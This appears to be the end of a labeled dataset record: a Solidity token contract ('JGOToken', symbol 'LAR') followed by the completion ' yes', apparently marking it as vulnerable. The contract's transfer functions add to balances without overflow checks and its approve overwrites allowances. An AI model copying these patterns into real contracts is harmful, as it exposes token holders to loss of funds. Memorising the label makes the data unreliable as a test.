balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n \r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n \r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n \r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n \r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n}\r\n \r\n\r\n\/\/JGO代币合约\r\ncontract JGOToken is StandardToken, SafeMath {\r\n    string  public constant name     = \"laeerg\";   \/\/名称\r\n    string  public constant symbol   = \"LAR\";   \/\/符号\r\n    uint256 public constant decimals = 9;      \/\/小数位\r\n    string  public           version = \"1.0\";   \/\/版本\r\n \r\n    address public ethFundDeposit;              \/\/ETH存放地址\r\n    uint256 public currentSupply;               \/\/代币供应量\r\n\r\n \r\n    modifier isOwner()  { require(msg.sender == ethFundDeposit); _; }\r\n\r\n    function formatDecimals(uint256 _value) internal returns (uint256 ) {\r\n        return _value * 10 ** decimals;\r\n    }\r\n\r\n \r\n    \/\/JGO合约初始化函数(合约所有人地址, 当前供应量, 代币总量)\r\n    function JGOToken(address _ethFundDeposit, uint256 _totalSupply) {\r\n        ethFundDeposit = _ethFundDeposit;\r\n                      \r\n        currentSupply = formatDecimals(_totalSupply); \/\/当前供应量\r\n        totalSupply = formatDecimals(_totalSupply);     \/\/代币总量\r\n        balances[msg.sender] = totalSupply;\r\n        if(currentSupply > totalSupply) throw;\r\n    }\r\n    \r\n}\n\n###\n\n","completion":" yes"}